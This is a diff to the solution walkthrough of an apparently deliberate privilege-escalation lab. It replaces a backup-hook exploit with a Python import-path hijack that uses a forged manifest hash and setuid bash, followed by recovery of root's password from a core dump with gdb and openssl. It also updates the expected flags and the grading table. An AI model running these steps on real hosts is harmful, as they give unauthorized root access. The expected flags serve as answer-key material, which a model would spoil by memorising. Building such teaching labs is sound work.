@@ -163,33 +163,53 @@ docker compose exec app cat /opt/shop/flags/stage1
 docker compose exec app bash   # (simulates the shell a real payload would give)
 id                              # ordinary appuser, no interesting group
 sudo -l                         # shows exactly one rule -- the only lead
-cat /opt/shop/scripts/archive_worker.py   # world-readable: sys.path.insert() bug
-cat /opt/shop/scripts/backup.sh           # also world-readable: sources backup.conf
+cat /opt/shop/scripts/archive_worker.py   # world-readable: sys.path.insert() bug + manifest check
 ls -la /opt/shop/backups/outbox/          # appuser-owned -- what archive_worker.py trusts
+cat /opt/shop/backups/outbox/handlers.manifest   # appuser-owned too -- the check's own weak point
 
-# Stage 11: hop 1, appuser -> opsuser (Python import-path hijack, CWE-427).
-# Plant a malicious "handler" module in the outbox directory, then invoke
-# archive_worker.py naming it -- __import__() resolves it from there
-# because appuser controls sys.path[0] for that invocation.
+# Stage 11: hop 1, appuser -> opsuser (Python import-path hijack past a
+# self-signed integrity check, CWE-427 + CWE-354). Plant a malicious
+# "handler" module in the outbox directory, register its own sha256 in
+# handlers.manifest (appuser controls both), then invoke archive_worker.py
+# naming it -- __import__() resolves it from there because appuser
+# controls sys.path[0] for that invocation.
 cat > /opt/shop/backups/outbox/evil.py <<'EOF'
 import os
 os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
 os.system("cat /opt/shop/flags/stage2 > /tmp/stage2_proof.txt && chmod 644 /tmp/stage2_proof.txt")
 EOF
+HASH=$(sha256sum /opt/shop/backups/outbox/evil.py | awk '{print $1}')
+python3 -c "
+import json
+p = '/opt/shop/backups/outbox/handlers.manifest'
+m = json.load(open(p))
+m['evil'] = '$HASH'
+json.dump(m, open(p, 'w'))
+"
 sudo -u opsuser /opt/shop/scripts/archive_worker.py evil
 cat /tmp/stage2_proof.txt            # proves the hop 1 -> hop 2 transition
 
-# Stage 12: hop 2, opsuser -> root (config-driven hook injection). backup.sh
-# is root-owned and not writable, but it sources backup.conf -- which
-# opsuser genuinely owns -- and `eval`s a POST_BACKUP_HOOK command from it.
+# Stage 12: hop 2, opsuser -> root (AES-GCM credential recovery from a
+# crash dump). opsuser has NO sudo grant at all here -- `sudo -l` shows
+# nothing. Instead, read the core dump rootwatch left behind and pull the
+# AES key, nonce, tag, and ciphertext for root's real account password
+# back out of it.
 /tmp/opsbash -p
-echo 'POST_BACKUP_HOOK="cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"' \
-  >> /opt/shop/scripts/backup.conf
-sudo /opt/shop/scripts/backup.sh
-/tmp/rootbash -p -c 'cat /root/final_flag'
+file /opt/shop/backups/diagnostics/rootwatch.core
+gdb -q -batch \
+    -ex "print/x *(unsigned char(*)[32])key" \
+    -ex "print/x *(unsigned char(*)[32])blob" \
+    /opt/shop/scripts/rootwatch/rootwatch \
+    /opt/shop/backups/diagnostics/rootwatch.core
+# reconstruct nonce (first 12 bytes of blob) / ciphertext / tag (last 16
+# bytes of blob) from the second print's output, then:
+openssl enc -d -aes-256-gcm -K <key-hex> -iv <nonce-hex> \
+    -in ciphertext.bin -out password.txt   # or use cryptography's AESGCM
+su - root   # with the recovered password
+cat /root/final_flag
 
 # Stage 13: root
-# expected output: AI-LAB{root_via_backup_conf_hook_injection}
+# expected output: AI-LAB{root_via_rootwatch_coredump_aesgcm_key_recovery}
 ```
 
 ## Where a student stopped (grading aid)
@@ -201,8 +221,8 @@ sudo /opt/shop/scripts/backup.sh
 | `service_token_used` (service=catalog-sync-service) in logs | Stage 6-7 |
 | `catalog_sync_product_created` (has_photo=true) / shell-metacharacter filename in `image_uploaded` | Stage 8 |
 | `/opt/shop/flags/stage1` readable / `image_processing_thumbnail_started` | Stage 9 |
-| `/opt/shop/flags/stage2` readable (as opsuser) | Stage 11 (hop 1: Python import-path hijack) |
-| `/root/final_flag` readable | Stage 13, full chain (hop 2: config-driven hook injection) |
+| `/opt/shop/flags/stage2` readable (as opsuser) | Stage 11 (hop 1: Python import-path hijack past a self-signed manifest) |
+| `/root/final_flag` readable | Stage 13, full chain (hop 2: AES-GCM credential recovery from a crash dump) |
 
 ## Running the automated tests
 
@@ -212,9 +232,10 @@ pytest tests/ -v
 ```
 
 Several tests are skipped outside a provisioned Linux container (they
-assert live file/account state -- `/opt/shop/scripts/backup.sh`,
-`/opt/shop/scripts/archive_worker.py`, `/opt/shop/scripts/backup.conf`'s
-ownership, the locked `opsuser` account, `/opt/shop/backups/outbox/`, and
+assert live file/account state -- `/opt/shop/scripts/archive_worker.py`,
+`/opt/shop/backups/outbox/handlers.manifest`'s ownership, the locked
+`opsuser` account with no sudo grant, `/opt/shop/scripts/rootwatch/`'s
+root-only key/blob files, the opsuser-owned core dump, and
 `/root/final_flag`); run them for real via:
 
 ```bash
